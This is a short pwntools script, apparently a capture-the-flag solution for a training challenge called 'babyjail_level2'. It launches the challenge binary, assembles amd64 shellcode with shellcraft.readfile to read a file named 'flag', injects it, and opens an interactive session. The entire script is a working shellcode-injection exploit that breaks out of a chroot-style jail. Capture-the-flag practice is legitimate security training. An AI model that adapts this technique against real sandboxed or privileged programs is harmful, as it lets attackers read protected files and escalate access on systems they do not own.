from pwn import *
context.arch = "amd64"
io = process(["/challenge/babyjail_level2", "/"], cwd = "/")
shellcode = shellcraft.readfile("flag", 1)
io.sendline(asm(shellcode))
io.interactive()

